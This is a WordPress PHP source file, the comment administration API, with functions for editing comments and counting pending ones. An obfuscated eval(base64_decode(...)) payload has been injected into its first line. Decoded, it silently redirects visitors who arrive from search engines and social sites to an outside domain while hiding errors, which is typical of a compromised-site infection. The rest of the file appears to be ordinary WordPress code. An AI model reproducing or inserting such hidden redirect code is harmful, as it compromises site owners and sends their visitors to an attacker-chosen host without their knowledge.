<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * WordPress Comment Administration API.
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * {@internal Missing Short Description}}
 *
 * @since unknown
 * @uses $wpdb
 *
 * @param string $comment_author
 * @param string $comment_date
 * @return mixed Comment ID on success.
 */
function comment_exists($comment_author, $comment_date) {
	global $wpdb;

	$comment_author = stripslashes($comment_author);
	$comment_date = stripslashes($comment_date);

	return $wpdb->get_var( $wpdb->prepare("SELECT comment_post_ID FROM $wpdb->comments
			WHERE comment_author = %s AND comment_date = %s", $comment_author, $comment_date) );
}

/**
 * {@internal Missing Short Description}}
 *
 * @since unknown
 */
function edit_comment() {

	$comment_post_ID = (int) $_POST['comment_post_ID'];

	if (!current_user_can( 'edit_post', $comment_post_ID ))
		wp_die( __('You are not allowed to edit comments on this post, so you cannot edit this comment.' ));

	$_POST['comment_author'] = $_POST['newcomment_author'];
	$_POST['comment_author_email'] = $_POST['newcomment_author_email'];
	$_POST['comment_author_url'] = $_POST['newcomment_author_url'];
	$_POST['comment_approved'] = $_POST['comment_status'];
	$_POST['comment_content'] = $_POST['content'];
	$_POST['comment_ID'] = (int) $_POST['comment_ID'];

	foreach ( array ('aa', 'mm', 'jj', 'hh', 'mn') as $timeunit ) {
		if ( !empty( $_POST['hidden_' . $timeunit] ) && $_POST['hidden_' . $timeunit] != $_POST[$timeunit] ) {
			$_POST['edit_date'] = '1';
			break;
		}
	}

	if (!empty ( $_POST['edit_date'] ) ) {
		$aa = $_POST['aa'];
		$mm = $_POST['mm'];
		$jj = $_POST['jj'];
		$hh = $_POST['hh'];
		$mn = $_POST['mn'];
		$ss = $_POST['ss'];
		$jj = ($jj > 31 ) ? 31 : $jj;
		$hh = ($hh > 23 ) ? $hh -24 : $hh;
		$mn = ($mn > 59 ) ? $mn -60 : $mn;
		$ss = ($ss > 59 ) ? $ss -60 : $ss;
		$_POST['comment_date'] = "$aa-$mm-$jj $hh:$mn:$ss";
	}

	wp_update_comment( $_POST);
}

/**
 * {@internal Missing Short Description}}
 *
 * @since unknown
 *
 * @param unknown_type $id
 * @return unknown
 */
function get_comment_to_edit( $id ) {
	if ( !$comment = get_comment($id) )
		return false;

	$comment->comment_ID = (int) $comment->comment_ID;
	$comment->comment_post_ID = (int) $comment->comment_post_ID;

	$comment->comment_content = format_to_edit( $comment->comment_content );
	$comment->comment_content = apply_filters( 'comment_edit_pre', $comment->comment_content);

	$comment->comment_author = format_to_edit( $comment->comment_author );
	$comment->comment_author_email = format_to_edit( $comment->comment_author_email );
	$comment->comment_author_url = format_to_edit( $comment->comment_author_url );
	$comment->comment_author_url = esc_url($comment->comment_author_url);

	return $comment;
}

/**
 * {@internal Missing Short Description}}
 *
 * @since unknown
 * @uses $wpdb
 *
 * @param int $post_id Post ID
 * @return unknown
 */
function get_pending_comments_num( $post_id ) {
	global $wpdb;

	$single = false;
	if ( !is_array($post_id) ) {
		$post_id = (array) $post_id;
		$single = true;
	}
	$post_id = array_map('intval', $post_id);
	$post_id = "'" . implode("', '", $post_id) . "'";

	$pending = $wpdb->get_results( "SELECT comment_post_ID, COUNT(comment_ID) as num_comments FROM $wpdb->comments WHERE comment_post_ID IN ( $post_id ) AND comment_approved = '0' GROUP BY comment_post_ID", ARRAY_N );

	if ( empty($pending) )
		return 0;

	if ( $single )
		return $pending[0][1];

	$pending_keyed = array();
	foreach ( $pending as $pend )
		$pending_keyed[$pend[0]] = $pend[1];

	return $pending_keyed;
}

/**
 * Add avatars to relevant places in admin, or try to.
 *
 * @since unknown
 * @uses $comment
 *
 * @param string $name User name.
 * @return string Avatar with Admin name.
 */
function floated_admin_avatar( $name ) {
	global $comment;

	$id = $avatar = false;
	if ( $comment->comment_author_email )
		$id = $comment->comment_author_email;
	if ( $comment->user_id )
		$id = $comment->user_id;

	if ( $id )
		$avatar = get_avatar( $id, 32 );

	return "$avatar $name";
}

function enqueue_comment_hotkeys_js() {
	if ( 'true' == get_user_option( 'comment_shortcuts' ) )
		wp_enqueue_script( 'jquery-table-hotkeys' );
}

if ( is_admin() && isset($pagenow) && ('edit-comments.php' == $pagenow || 'edit.php' == $pagenow) ) {
	if ( get_option('show_avatars') )
		add_filter( 'comment_author', 'floated_admin_avatar' );
}

?>
